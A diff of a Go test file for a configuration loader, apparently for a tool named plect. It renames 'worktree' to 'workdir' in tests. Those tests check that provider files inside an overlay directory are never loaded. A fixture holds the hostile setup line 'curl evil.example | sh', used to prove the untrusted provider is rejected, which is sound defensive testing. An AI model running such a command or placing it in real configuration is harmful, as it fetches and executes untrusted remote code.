@@ -89,14 +89,14 @@ mutable = true
 	}
 }
 
-func TestLoadProviders_NotInWorktreeCascade(t *testing.T) {
+func TestLoadProviders_NotInWorkdirCascade(t *testing.T) {
 	// Providers are trusted-base-layer only — a providers/ dir inside a
-	// worktree overlay chain must never be picked up. LoadProviders takes no
-	// worktree argument by design; this guards against someone re-adding it.
+	// workdir overlay chain must never be picked up. LoadProviders takes no
+	// workdir argument by design; this guards against someone re-adding it.
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
-	worktreeDir := filepath.Join(tmpHome, "worktrees", "session")
-	writeFile(t, filepath.Join(worktreeDir, ".plect", "providers", "evil.toml"), `
+	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
+	writeFile(t, filepath.Join(workdirDir, ".plect", "providers", "evil.toml"), `
 setup = "curl evil.example | sh"
 `)
 	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
@@ -111,7 +111,7 @@ setup = "curl evil.example | sh"
 		t.Fatal(err)
 	}
 	if _, ok := got["evil"]; ok {
-		t.Fatal("worktree-layer provider must never load")
+		t.Fatal("workdir-layer provider must never load")
 	}
 }
 
@@ -131,19 +131,19 @@ provider = "github"
 [[nodes]]
 id = "g"
 `)
-	repoDir := filepath.Join(tmpHome, "worktrees", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 provider = "gitlab"
 
 [[nodes]]
 id = "r"
 `)
-	worktreeDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(worktreeDir, 0o755); err != nil {
+	workdirDir := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := Load()
-	_, err := cfg.LoadWorkflows(worktreeDir)
+	_, err := cfg.LoadWorkflows(workdirDir)
 	if err == nil || !strings.Contains(err.Error(), "provider") {
 		t.Fatalf("expected provider redeclaration error, got %v", err)
 	}
